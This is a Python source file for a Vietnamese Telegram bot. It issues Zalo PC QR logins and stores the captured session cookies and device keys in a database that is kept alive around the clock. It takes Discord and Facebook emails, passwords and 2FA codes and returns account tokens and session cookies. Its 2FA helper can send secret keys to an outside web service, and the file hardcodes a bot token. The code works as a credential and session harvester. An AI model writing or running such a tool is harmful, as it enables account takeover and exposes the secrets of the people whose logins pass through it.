import os
import re
import io
import time
import json
import hmac
import base64
import struct
import sqlite3
import hashlib
import threading
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO
import requests
from requests.adapters import HTTPAdapter

try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

from zalo_login import (
    login_qr_with_unique_imei,
    LoginQRCallbackEventType,
    ZaloPCSessionKeeper,
)

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8995799349:AAE8uwWyS-CHzj2yQNkFkMynCTprFTZ1JNc")
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "database.db")
MENU_BANNER_PATH = os.path.join(BASE_DIR, "menu_banner.png")

API_2FA = "https://keyherlyswar.x10.mx/Apidocs/tien_ich/2fa.php?secret={}"


def add_border_to_qr(image_data: bytes) -> bytes:
    """Thêm viền trắng chuẩn (Quiet Zone 28px) xung quanh mã QR để camera điện thoại quét qua màn hình khác nhận diện ngay trong 0.1s!"""
    if not HAS_PIL or not image_data:
        return image_data
    try:
        img = Image.open(BytesIO(image_data))
        if img.mode == "RGBA":
            bg_w = Image.new("RGB", img.size, (255, 255, 255))
            bg_w.paste(img, mask=img.split()[3])
            img = bg_w
        elif img.mode != "RGB":
            img = img.convert("RGB")
        pad = 28
        out_im = Image.new("RGB", (img.width + pad * 2, img.height + pad * 2), (255, 255, 255))
        out_im.paste(img, (pad, pad))
        buf = BytesIO()
        out_im.save(buf, format="PNG")
        return buf.getvalue()
    except Exception:
        return image_data


def generate_totp_local(secret_key, time_step=30, digits=6):
    if not secret_key:
        return None, 0
    clean_sec = re.sub(r"[^A-Za-z2-7]", "", str(secret_key)).upper()
    now_int = int(time.time())
    rem_sec = time_step - (now_int % time_step)
    if clean_sec:
        pad_len = (8 - (len(clean_sec) % 8)) % 8
        try:
            key_bytes = base64.b32decode(clean_sec + ("=" * pad_len), casefold=True)
            counter = now_int // time_step
            msg = struct.pack(">Q", counter)
            digest = hmac.new(key_bytes, msg, hashlib.sha1).digest()
            offset = digest[-1] & 0x0F
            code_int = (struct.unpack(">I", digest[offset:offset + 4])[0] & 0x7FFFFFFF) % (10 ** digits)
            return str(code_int).zfill(digits), rem_sec
        except Exception:
            pass
    try:
        r = requests.get(API_2FA.format(str(secret_key).replace(" ", "")), timeout=6).json()
        if r.get("token"):
            return str(r["token"]), rem_sec
    except Exception:
        pass
    return None, 0


def sync_zalo_account_to_web_db(uid, display_name, imei, cookies_dict, zpw_enk="", user_agent="", pc_name=""):
    if not imei or not cookies_dict:
        return False
    try:
        conn = sqlite3.connect(DB_PATH, timeout=15)
        cur = conn.cursor()
        c_json = json.dumps(cookies_dict, ensure_ascii=False)
        now = time.time()
        cur.execute(
            """CREATE TABLE IF NOT EXISTS zalo_cookie_vault (
                uid TEXT PRIMARY KEY,
                display_name TEXT DEFAULT '',
                imei TEXT DEFAULT '',
                cookies_json TEXT DEFAULT '{}',
                zpw_enk TEXT DEFAULT '',
                user_agent TEXT DEFAULT '',
                updated_at REAL
            )"""
        )
        cur.execute(
            """INSERT OR REPLACE INTO zalo_cookie_vault
               (uid, display_name, imei, cookies_json, zpw_enk, user_agent, updated_at)
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (str(uid or imei), str(display_name or "Zalo VN"), str(imei), c_json, str(zpw_enk or ""), str(user_agent or ""), now),
        )
        existing = cur.execute("SELECT id FROM accounts WHERE platform='zalo' AND (uid=? OR imei=?)", (str(uid), str(imei))).fetchone()
        if existing:
            cur.execute(
                "UPDATE accounts SET name=?, imei=?, cookies=?, uid=?, user_agent=?, zpw_enk=?, pc_name=?, chat_cmd_enabled=1, enabled=1 WHERE id=?",
                (str(display_name), str(imei), c_json, str(uid), str(user_agent), str(zpw_enk), str(pc_name), existing[0]),
            )
        else:
            cur.execute(
                """INSERT INTO accounts (name, platform, imei, cookies, token, is_bot, uid, chat_cmd_enabled, cmd_prefix, allow_all_cmd, enabled, user_agent, zpw_enk, pc_name, created_at)
                   VALUES (?, 'zalo', ?, ?, '', 0, ?, 1, '.', 1, 1, ?, ?, ?, ?)""",
                (str(display_name), str(imei), c_json, str(uid), str(user_agent), str(zpw_enk), str(pc_name), now),
            )
        conn.commit()
        conn.close()
        return True
    except Exception:
        return False


class DiscordTokenGetter:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            "authority": "discord.com",
            "accept": "*/*",
            "accept-language": "vi-VN,vi;q=0.95",
            "content-type": "application/json",
            "origin": "https://discord.com",
            "referer": "https://discord.com/login",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        }
        self.session.headers.update(self.headers)

    def login_discord(self, email, password, twofa_code="", twofa_type="totp"):
        try:
            self.session.get("https://discord.com/login", timeout=8)
            payload = {
                "gift_code_sku_id": None,
                "login": str(email).strip(),
                "login_source": None,
                "password": str(password).strip(),
                "undelete": False,
            }
            r = self.session.post("https://discord.com/api/v9/auth/login", json=payload, timeout=12)
            d = r.json() if r.content else {}
            if r.status_code == 200 and d.get("token"):
                return d["token"], d.get("user_id", ""), "Thành công"
            if d.get("mfa") and d.get("ticket"):
                if not twofa_code:
                    return None, None, "NEED_2FA"
                clean_code = str(twofa_code).strip().replace(" ", "")
                if len(clean_code) >= 12 and not clean_code.isdigit():
                    otp_c, _ = generate_totp_local(clean_code)
                    if otp_c:
                        clean_code = otp_c
                mfa_ep = "https://discord.com/api/v9/auth/mfa/backup" if twofa_type == "backup" else "https://discord.com/api/v9/auth/mfa/totp"
                r2 = self.session.post(
                    mfa_ep,
                    json={
                        "code": clean_code,
                        "ticket": d["ticket"],
                        "login_instance_id": d.get("login_instance_id"),
                        "gift_code_sku_id": None,
                        "login_source": None,
                    },
                    timeout=12,
                )
                d2 = r2.json() if r2.content else {}
                if r2.status_code == 200 and d2.get("token"):
                    return d2["token"], d.get("user_id", ""), "Thành công"
                return None, None, d2.get("message") or "Mã 2FA không chính xác"
            return None, None, d.get("message") or f"Không thể đăng nhập (Mã {r.status_code})"
        except Exception as e:
            return None, None, str(e)


class FacebookCookieGetter:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            "authority": "www.facebook.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "vi-VN,vi;q=0.95",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        }
        self.session.headers.update(self.headers)

    def login_facebook(self, email, password, twofa_code=""):
        try:
            self.session.get("https://www.facebook.com/login.php", timeout=12)
            login_data = {"email": str(email).strip(), "pass": str(password).strip(), "login": "Log In"}
            self.session.post("https://www.facebook.com/login.php", data=login_data, allow_redirects=True, timeout=18)
            cookies = self.session.cookies.get_dict()
            if "c_user" in cookies and "xs" in cookies:
                cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
                return cookie_str, str(cookies.get("c_user")), "Thành công"
            return None, None, "Tài khoản bật phê duyệt 2 lớp hoặc sai mật khẩu."
        except Exception as e:
            return None, None, str(e)


discord_getter = DiscordTokenGetter()
fb_getter = FacebookCookieGetter()


class DirectTelegramBotRunner:
    def __init__(self, token=TELEGRAM_BOT_TOKEN):
        self.token = str(token or TELEGRAM_BOT_TOKEN).strip()
        self.api_base = f"https://api.telegram.org/bot{self.token}"
        self.stop_ev = threading.Event()
        self.offset = 0
        self.session = requests.Session()
        adapter = HTTPAdapter(pool_connections=32, pool_maxsize=64, max_retries=2)
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)
        self.executor = ThreadPoolExecutor(max_workers=16)
        self.active_qr_locks = set()
        self.user_states = {}
        self.bot_username = ""
        self.started_at = time.time()
        self.processed_updates = 0
        self.last_error = ""

    def api_call(self, method, data=None, files=None, timeout=25):
        try:
            url = f"{self.api_base}/{method}"
            if files:
                r = self.session.post(url, data=data, files=files, timeout=timeout)
            else:
                r = self.session.post(
                    url,
                    json=data if isinstance(data, dict) else None,
                    data=None if isinstance(data, dict) else data,
                    timeout=timeout,
                )
            return r.json() if r.content else {}
        except Exception as e:
            self.last_error = str(e)
            return {"ok": False, "error": str(e)}

    def clear_webhook_and_init(self):
        try:
            self.api_call("deleteWebhook", data={"drop_pending_updates": False}, timeout=10)
            me = self.api_call("getMe", timeout=10)
            if me.get("ok") and isinstance(me.get("result"), dict):
                self.bot_username = me["result"].get("username") or "helloword2102_bot"
            self.api_call(
                "setMyCommands",
                data={
                    "commands": [
                        {"command": "start", "description": "Menu chính"},
                        {"command": "qr", "description": "Tạo mã QR Zalo PC"},
                        {"command": "get", "description": "Lấy Token Discord / Cookie FB"},
                        {"command": "2fa", "description": "Tạo mã OTP 2FA"},
                        {"command": "status", "description": "Xem thiết bị đang Online"},
                    ]
                },
                timeout=10,
            )
        except Exception as e:
            self.last_error = str(e)

    def send_text(self, chat_id, text, reply_to=None, parse_mode="HTML", reply_markup=None):
        pl = {"chat_id": chat_id, "text": text, "disable_web_page_preview": True}
        if parse_mode:
            pl["parse_mode"] = parse_mode
        if reply_to:
            pl["reply_to_message_id"] = reply_to
        if reply_markup:
            pl["reply_markup"] = reply_markup
        return self.api_call("sendMessage", data=pl)

    def send_menu_with_horizontal_banner(self, chat_id, caption_html, reply_to=None, reply_markup=None):
        kb = reply_markup if reply_markup is not None else self.build_main_menu_keyboard()
        return self.send_text(chat_id, caption_html, reply_to=reply_to, parse_mode="HTML", reply_markup=kb)

    def answer_callback(self, callback_query_id, text=""):
        pl = {"callback_query_id": callback_query_id}
        if text:
            pl["text"] = text
        return self.api_call("answerCallbackQuery", data=pl, timeout=8)

    def send_photo_bytes(self, chat_id, png_bytes, caption="", reply_to=None, reply_markup=None):
        pl = {"chat_id": str(chat_id), "caption": caption, "parse_mode": "HTML"}
        if reply_to:
            pl["reply_to_message_id"] = str(reply_to)
        if reply_markup:
            pl["reply_markup"] = json.dumps(reply_markup, ensure_ascii=False)
        return self.api_call("sendPhoto", data=pl, files={"photo": ("zalo_qr.png", png_bytes, "image/png")})

    def send_doc_bytes(self, chat_id, content_bytes, filename, caption="", reply_to=None):
        pl = {"chat_id": str(chat_id), "caption": caption, "parse_mode": "HTML"}
        if reply_to:
            pl["reply_to_message_id"] = str(reply_to)
        return self.api_call("sendDocument", data=pl, files={"document": (filename, content_bytes, "text/plain")})

    def delete_msg(self, chat_id, message_id):
        if not message_id:
            return
        self.api_call("deleteMessage", data={"chat_id": chat_id, "message_id": message_id}, timeout=8)

    @staticmethod
    def build_main_menu_keyboard():
        return {
            "inline_keyboard": [
                [
                    {"text": "🇻🇳 Tạo QR Zalo (Việt Nam)", "callback_data": "qr_vn_hcm"},
                    {"text": "🇸🇬 Tạo QR Zalo (Singapore)", "callback_data": "qr_sg_vip"},
                ],
                [
                    {"text": "💻 Tạo QR MacBook", "callback_data": "qr_vn_mac"},
                    {"text": "🖥️ Thiết Bị Đang Online", "callback_data": "menu_status"},
                ],
                [
                    {"text": "🔑 Lấy Token Discord", "callback_data": "menu_discord"},
                    {"text": "🍪 Lấy Cookie FB", "callback_data": "menu_facebook"},
                    {"text": "🔐 Mã 2FA", "callback_data": "menu_2fa"},
                ],
            ]
        }

    @staticmethod
    def build_main_menu_caption():
        return (
            "⚡ <b>NHK SYSTEM — Phan Anh Khôi (Rike)</b>\n"
            "• <b>/qr</b> — Tạo mã QR Zalo PC (VN / SG)\n"
            "• <b>/get</b> — Lấy Token Discord / Cookie FB\n"
            "• <b>/2fa</b> — Lấy mã OTP 2FA 6 số\n"
            "• <b>/status</b> — Thiết bị đang Online 24/7\n\n"
            "👇 <b>Chọn chức năng bên dưới:</b>"
        )

    def handle_zalo_qr_command(self, chat_id, user_id, msg_id=None, region_code="vn_hcm", custom_pc_name=""):
        if user_id in self.active_qr_locks:
            self.send_text(
                chat_id,
                "⏳ <b>Đang có mã QR chờ quét.</b> Vui lòng quét mã hiện tại hoặc chờ hết hạn.",
                reply_to=msg_id,
            )
            return
        self.active_qr_locks.add(user_id)

        def _worker():
            qr_msg_id = None
            scan_msg_id = None
            try:
                wait_r = self.send_text(
                    chat_id,
                    "⏳ <b>Đang tạo mã QR Zalo PC...</b>",
                    reply_to=msg_id,
                )
                wait_id = (wait_r.get("result") or {}).get("message_id")

                def _sync_cb(event):
                    nonlocal qr_msg_id, scan_msg_id
                    ev_type = event.get("type")
                    ev_data = event.get("data") or {}
                    if ev_type == LoginQRCallbackEventType.QRCodeGenerated:
                        self.delete_msg(chat_id, wait_id)
                        raw_b64 = str(ev_data.get("image") or "").split(",", 1)[-1].strip()
                        raw_png = base64.b64decode(raw_b64 + ("=" * ((4 - len(raw_b64) % 4) % 4)))
                        bordered_png = add_border_to_qr(raw_png)
                        pc_lbl = ev_data.get("pc_name") or "Zalo PC"
                        reg_lbl = ev_data.get("region_label") or "Việt Nam"
                        cap = (
                            f"📲 <b>QUÉT MÃ QR ĐĂNG NHẬP ZALO PC</b>\n"
                            f"• Thiết bị: <b>{pc_lbl}</b>\n"
                            f"• Khu vực: <b>{reg_lbl}</b>\n"
                            f"• Hiệu lực: <b>100 giây</b>\n"
                            f"👉 Mở Zalo quét mã và bấm <b>Đăng nhập</b>."
                        )
                        pr = self.send_photo_bytes(chat_id, bordered_png, caption=cap, reply_to=msg_id)
                        qr_msg_id = (pr.get("result") or {}).get("message_id")

                    elif ev_type == LoginQRCallbackEventType.QRCodeScanned:
                        self.delete_msg(chat_id, qr_msg_id)
                        d_name = ev_data.get("display_name") or "Zalo"
                        sr = self.send_text(
                            chat_id,
                            f"✅ <b>Đã quét: {d_name}</b> — Hãy bấm <b>Đăng nhập</b> trên điện thoại!",
                            reply_to=msg_id,
                        )
                        scan_msg_id = (sr.get("result") or {}).get("message_id")

                    elif ev_type == LoginQRCallbackEventType.QRCodeExpired:
                        self.delete_msg(chat_id, qr_msg_id)
                        self.delete_msg(chat_id, scan_msg_id)
                        self.send_text(
                            chat_id,
                            "⏰ <b>Mã QR đã hết hạn.</b> Gõ /qr hoặc bấm nút bên dưới để lấy mã mới.",
                            reply_to=msg_id,
                            reply_markup=self.build_main_menu_keyboard(),
                        )

                    elif ev_type == LoginQRCallbackEventType.QRCodeDeclined:
                        self.delete_msg(chat_id, qr_msg_id)
                        self.delete_msg(chat_id, scan_msg_id)
                        self.send_text(chat_id, "❌ <b>Đã hủy đăng nhập QR trên điện thoại.</b>", reply_to=msg_id)

                    elif ev_type == LoginQRCallbackEventType.GotLoginInfo:
                        self.delete_msg(chat_id, scan_msg_id)
                        cookies = ev_data.get("cookies") or {}
                        imei = ev_data.get("imei") or ""
                        zpw_enk = ev_data.get("zpw_enk") or ""
                        ua = ev_data.get("user_agent") or ""
                        pc_name = ev_data.get("pc_name") or "Zalo PC"
                        u_info = ev_data.get("user_info") or {}
                        d_name = ev_data.get("display_name") or u_info.get("displayName") or "Zalo User"
                        uid = ev_data.get("uid") or u_info.get("uid") or "N/A"
                        grp_cnt = ev_data.get("groups_count") or u_info.get("groups_count") or 0

                        sync_zalo_account_to_web_db(
                            uid=uid, display_name=d_name, imei=imei,
                            cookies_dict=cookies, zpw_enk=zpw_enk,
                            user_agent=ua, pc_name=pc_name
                        )

                        cookies_str = json.dumps(cookies, ensure_ascii=False, indent=2)
                        file_txt = (
                            f"# ZALO PC SESSION - {d_name} (UID: {uid})\n"
                            f"PC_Device: {pc_name}\n"
                            f"Imei:\n{imei}\n\n"
                            f"Zpw_Enk:\n{zpw_enk}\n\n"
                            f"User_Agent:\n{ua}\n\n"
                            f"Cookie:\n{cookies_str}\n"
                        )
                        cap_ok = (
                            f"✅ <b>ĐĂNG NHẬP ZALO THÀNH CÔNG!</b>\n"
                            f"• Tài khoản: <b>{d_name}</b> (UID: {uid})\n"
                            f"• Thiết bị: <b>{pc_name}</b> ({grp_cnt} nhóm)\n"
                            f"• IMEI: {imei}\n"
                            f"• Trạng thái: <b>Đã lưu vào Web &amp; giữ sống 24/7</b>"
                        )
                        safe_fn = re.sub(r"[^\w\-\.]", "_", d_name) + "_zalo.txt"
                        self.send_doc_bytes(chat_id, file_txt.encode("utf-8"), safe_fn, caption=cap_ok, reply_to=msg_id)

                login_qr_with_unique_imei(
                    callback=_sync_cb, timeout=105,
                    custom_pc_name=custom_pc_name, region_code=region_code
                )
            except Exception as e:
                self.send_text(chat_id, f"⚠️ Lỗi tạo QR: {e}", reply_to=msg_id)
            finally:
                self.active_qr_locks.discard(user_id)

        threading.Thread(target=_worker, daemon=True).start()

    def process_callback_query(self, cb):
        cb_id = cb.get("id")
        data = str(cb.get("data") or "")
        from_u = cb.get("from") or {}
        user_id = from_u.get("id")
        msg = cb.get("message") or {}
        chat_id = (msg.get("chat") or {}).get("id")
        msg_id = msg.get("message_id")
        self.answer_callback(cb_id)
        if not chat_id or not user_id:
            return

        if data.startswith("qr_"):
            reg = data.replace("qr_", "")
            self.handle_zalo_qr_command(chat_id, user_id, msg_id=msg_id, region_code=reg)
        elif data == "menu_discord":
            self.user_states[user_id] = {"tool": "discord", "step": "email"}
            self.send_text(chat_id, "🔑 <b>Gửi Email hoặc SĐT Discord:</b>", reply_to=msg_id)
        elif data == "menu_facebook":
            self.user_states[user_id] = {"tool": "facebook", "step": "email"}
            self.send_text(chat_id, "🍪 <b>Gửi Email hoặc SĐT Facebook:</b>", reply_to=msg_id)
        elif data == "menu_2fa":
            self.user_states[user_id] = {"tool": "2fa", "step": "secret"}
            self.send_text(chat_id, "🔐 <b>Gửi mã Secret Key 2FA:</b>", reply_to=msg_id)
        elif data == "menu_status":
            self.send_status_report(chat_id, msg_id)

    def send_status_report(self, chat_id, reply_to=None):
        active_devs = ZaloPCSessionKeeper.list_active_devices()
        if not active_devs:
            cap_s = (
                "📊 <b>TRẠNG THÁI HỆ THỐNG</b>\n"
                "• Bot Telegram: <b>Đang hoạt động 24/7</b>\n"
                "• Thiết bị Zalo PC: <b>0 thiết bị</b>\n"
                "👉 Bấm nút bên dưới hoặc gõ <b>/qr</b> để tạo mã QR mới."
            )
        else:
            lines_s = [f"🖥️ <b>THIẾT BỊ ĐANG ONLINE ({len(active_devs)}):</b>"]
            for dv in active_devs:
                lines_s.append(f"• <b>{dv['display_name']}</b> — {dv['pc_name']} (UID: {dv['uid']})")
            cap_s = "\n".join(lines_s)
        self.send_menu_with_horizontal_banner(chat_id, cap_s, reply_to=reply_to)

    def handle_interactive_state(self, chat_id, user_id, text, msg_id):
        st = self.user_states.get(user_id)
        if not st:
            return False
        tool = st.get("tool")
        step = st.get("step")

        if tool == "2fa" and step == "secret":
            self.user_states.pop(user_id, None)
            code_6, rem_s = generate_totp_local(text)
            if code_6:
                self.send_text(chat_id, f"🔐 <b>Mã OTP 2FA:</b> <b>{code_6}</b> (Còn {rem_s}s)", reply_to=msg_id)
            else:
                self.send_text(chat_id, "❌ Secret Key 2FA không hợp lệ!", reply_to=msg_id)
            return True

        if tool == "facebook":
            if step == "email":
                st["email"] = text.strip()
                st["step"] = "password"
                self.send_text(chat_id, "📌 <b>Bước 2:</b> Gửi <b>Mật khẩu Facebook</b>:", reply_to=msg_id)
                return True
            elif step == "password":
                email = st.get("email", "")
                self.user_states.pop(user_id, None)
                self.send_text(chat_id, "⏳ Đang lấy Cookie Facebook...", reply_to=msg_id)
                ck, uid, msg_s = fb_getter.login_facebook(email, text.strip())
                if ck:
                    fn = f"fb_cookie_{uid}.txt"
                    self.send_doc_bytes(chat_id, f"UID: {uid}\nCookie:\n{ck}\n".encode("utf-8"), fn, caption=f"✅ <b>Đã lấy Cookie FB (UID: {uid})</b>", reply_to=msg_id)
                else:
                    self.send_text(chat_id, f"❌ Lỗi: {msg_s}", reply_to=msg_id)
                return True

        if tool == "discord":
            if step == "email":
                st["email"] = text.strip()
                st["step"] = "password"
                self.send_text(chat_id, "📌 <b>Bước 2:</b> Gửi <b>Mật khẩu Discord</b>:", reply_to=msg_id)
                return True
            elif step == "password":
                st["password"] = text.strip()
                tk, uid, msg_s = discord_getter.login_discord(st["email"], st["password"], "")
                if tk:
                    self.user_states.pop(user_id, None)
                    self.send_text(chat_id, f"✅ <b>Token Discord (UID: {uid}):</b>\n{tk}", reply_to=msg_id)
                elif msg_s == "NEED_2FA":
                    st["step"] = "2fa"
                    self.send_text(chat_id, "🔐 Gửi <b>Mã 6 số 2FA</b> hoặc <b>Secret Key</b>:", reply_to=msg_id)
                else:
                    self.user_states.pop(user_id, None)
                    self.send_text(chat_id, f"❌ Lỗi: {msg_s}", reply_to=msg_id)
                return True
            elif step == "2fa":
                email = st.get("email", "")
                pw = st.get("password", "")
                self.user_states.pop(user_id, None)
                tk, uid, msg_s = discord_getter.login_discord(email, pw, text.strip())
                if tk:
                    self.send_text(chat_id, f"✅ <b>Token Discord (UID: {uid}):</b>\n{tk}", reply_to=msg_id)
                else:
                    self.send_text(chat_id, f"❌ Lỗi: {msg_s}", reply_to=msg_id)
                return True

        return False

    def process_update(self, upd):
        self.processed_updates += 1
        if "callback_query" in upd:
            self.process_callback_query(upd["callback_query"])
            return

        msg = upd.get("message") or upd.get("edited_message") or {}
        chat = msg.get("chat") or {}
        chat_id = chat.get("id")
        from_u = msg.get("from") or {}
        user_id = from_u.get("id") or chat_id
        msg_id = msg.get("message_id")
        text = str(msg.get("text") or "").strip()
        if not chat_id or not text:
            return

        if not text.startswith("/") and not text.startswith("."):
            self.handle_interactive_state(chat_id, user_id, text, msg_id)
            return

        self.user_states.pop(user_id, None)
        parts = text.split()
        raw_cmd = parts[0].lower().split("@")[0]
        cmd = "/" + raw_cmd.lstrip("/.")
        args = parts[1:]

        if cmd in ("/start", "/help", "/menu", "/m", "/h"):
            self.send_menu_with_horizontal_banner(
                chat_id,
                self.build_main_menu_caption(),
                reply_to=msg_id,
                reply_markup=self.build_main_menu_keyboard(),
            )

        elif cmd == "/qr" or (cmd == "/get" and args and args[0].lower() == "zalo"):
            reg_arg = (args[0].lower() if (cmd == "/qr" and args) else (args[1].lower() if len(args) > 1 else "vn"))
            reg_map = {
                "sg": "sg_vip",
                "singapore": "sg_vip",
                "hcm": "vn_hcm",
                "vn": "vn_hcm",
                "hn": "vn_hn",
                "hanoi": "vn_hn",
                "dn": "vn_dn",
                "danang": "vn_dn",
                "mac": "vn_mac",
                "macair": "vn_mac_air",
                "imac": "vn_imac",
                "macstudio": "vn_mac_studio",
                "dell": "vn_dell_xps",
                "thinkpad": "vn_thinkpad",
                "hp": "vn_hp_spectre",
            }
            reg_code = reg_map.get(reg_arg, "vn_hcm")
            custom_pc = " ".join(args[1:]) if (cmd == "/qr" and len(args) > 1) else ""
            self.handle_zalo_qr_command(chat_id, user_id, msg_id=msg_id, region_code=reg_code, custom_pc_name=custom_pc)

        elif cmd == "/get":
            if not args:
                self.send_menu_with_horizontal_banner(
                    chat_id,
                    self.build_main_menu_caption(),
                    reply_to=msg_id,
                    reply_markup=self.build_main_menu_keyboard(),
                )
                return
            plat = args[0].lower()
            if plat == "discord" and len(args) < 3:
                self.user_states[user_id] = {"tool": "discord", "step": "email"}
                self.send_text(chat_id, "🔑 <b>Gửi Email / SĐT Discord:</b>", reply_to=msg_id)
                return
            if plat in ("facebook", "fb") and len(args) < 3:
                self.user_states[user_id] = {"tool": "facebook", "step": "email"}
                self.send_text(chat_id, "🍪 <b>Gửi Email / SĐT Facebook:</b>", reply_to=msg_id)
                return
            if len(args) >= 3:
                u_acc, u_pw = args[1], args[2]
                u_2fa = args[3] if len(args) > 3 else ""
                if plat == "discord":
                    tk, uid, st_m = discord_getter.login_discord(u_acc, u_pw, u_2fa)
                    if tk:
                        self.send_text(chat_id, f"✅ <b>Token Discord (UID: {uid}):</b>\n{tk}", reply_to=msg_id)
                    else:
                        self.send_text(chat_id, f"❌ Lỗi: {st_m}", reply_to=msg_id)
                elif plat in ("facebook", "fb"):
                    ck, uid, st_m = fb_getter.login_facebook(u_acc, u_pw, u_2fa)
                    if ck:
                        self.send_text(chat_id, f"✅ <b>Cookie FB (UID: {uid}):</b>\n{ck}", reply_to=msg_id)
                    else:
                        self.send_text(chat_id, f"❌ Lỗi: {st_m}", reply_to=msg_id)

        elif cmd == "/2fa":
            if not args:
                self.user_states[user_id] = {"tool": "2fa", "step": "secret"}
                self.send_text(chat_id, "🔐 <b>Gửi mã Secret Key 2FA:</b>", reply_to=msg_id)
                return
            code_v, rem_s = generate_totp_local("".join(args))
            if code_v:
                self.send_text(chat_id, f"🔐 <b>Mã 2FA OTP:</b> <b>{code_v}</b> (Còn {rem_s}s)", reply_to=msg_id)
            else:
                self.send_text(chat_id, "❌ Secret Key không hợp lệ.", reply_to=msg_id)

        elif cmd == "/font":
            sample = " ".join(args).strip() or "Phan Anh Khoi Rike"
            normal = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
            styles = {
                "Bold Serif": "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗",
                "Bold Sans": "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝐮𝘃𝘄𝘅𝘆𝘇𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵",
                "Script": "𝒜ℬ𝒞𝒟ℰℱ𝒢ℋℐ𝒥𝒦ℒℳ𝒩𝒪𝒫𝒬ℛ𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵𝒶𝒷𝒸𝒹ℯ𝒻ℊ𝒽𝒾𝒿𝓀𝓁𝓂𝓃ℴ𝓅𝓆𝓇𝓈𝓉𝓊𝓋𝓌𝓍𝓎𝓏0123456789",
                "Double Struck": "𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ𝕒𝕓𝕔𝕕𝖊𝖋𝖌𝖍𝖎𝖏𝖐𝖑𝖒𝖓𝖔𝖕𝖖𝖗𝖘𝖙𝖚𝖛𝖜𝖝𝖞𝖟𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡",
            }
            lines_f = ["✨ <b>BẢNG FONT CHỮ:</b>"]
            for st_name, table in styles.items():
                if len(table) == len(normal):
                    tr = sample.translate(str.maketrans(normal, table))
                    lines_f.append(f"• <b>{st_name}:</b> {tr}")
            self.send_text(chat_id, "\n".join(lines_f), reply_to=msg_id)

        elif cmd == "/status":
            self.send_status_report(chat_id, reply_to=msg_id)

    def run_forever(self):
        self.clear_webhook_and_init()
        while not self.stop_ev.is_set():
            try:
                res = self.api_call(
                    "getUpdates",
                    data={"offset": self.offset, "timeout": 20, "allowed_updates": ["message", "callback_query"]},
                    timeout=26,
                )
                if isinstance(res, dict) and res.get("ok") and isinstance(res.get("result"), list):
                    for upd in res["result"]:
                        self.offset = max(self.offset, int(upd.get("update_id", 0)) + 1)
                        self.executor.submit(self._safe_process_update, upd)
                else:
                    err_code = res.get("error_code") if isinstance(res, dict) else 0
                    if err_code == 409:
                        self.clear_webhook_and_init()
                    time.sleep(1.5)
            except Exception as e:
                self.last_error = str(e)
                time.sleep(1.5)

    def _safe_process_update(self, upd):
        try:
            self.process_update(upd)
        except Exception as ex_u:
            self.last_error = str(ex_u)


_GLOBAL_RUNNER_INSTANCE = None
_RUNNER_LOCK = threading.RLock()


def start_background_telegram_bot(token=TELEGRAM_BOT_TOKEN, force_restart=False):
    global _GLOBAL_RUNNER_INSTANCE
    with _RUNNER_LOCK:
        if _GLOBAL_RUNNER_INSTANCE is not None and not force_restart:
            return _GLOBAL_RUNNER_INSTANCE
        if _GLOBAL_RUNNER_INSTANCE is not None and force_restart:
            try:
                _GLOBAL_RUNNER_INSTANCE.stop_ev.set()
            except Exception:
                pass
        runner = DirectTelegramBotRunner(token=token)
        _GLOBAL_RUNNER_INSTANCE = runner
        th = threading.Thread(target=runner.run_forever, daemon=True)
        th.start()
        return runner


def get_telegram_bot_status():
    with _RUNNER_LOCK:
        r = _GLOBAL_RUNNER_INSTANCE
        if r is None:
            return {"running": False, "bot_username": "", "processed_updates": 0}
        return {
            "running": not r.stop_ev.is_set(),
            "bot_username": r.bot_username or "helloword2102_bot",
            "processed_updates": r.processed_updates,
            "uptime_sec": int(time.time() - r.started_at),
            "last_error": r.last_error,
        }


def main():
    runner = DirectTelegramBotRunner(token=TELEGRAM_BOT_TOKEN)
    runner.run_forever()


if __name__ == "__main__":
    main()
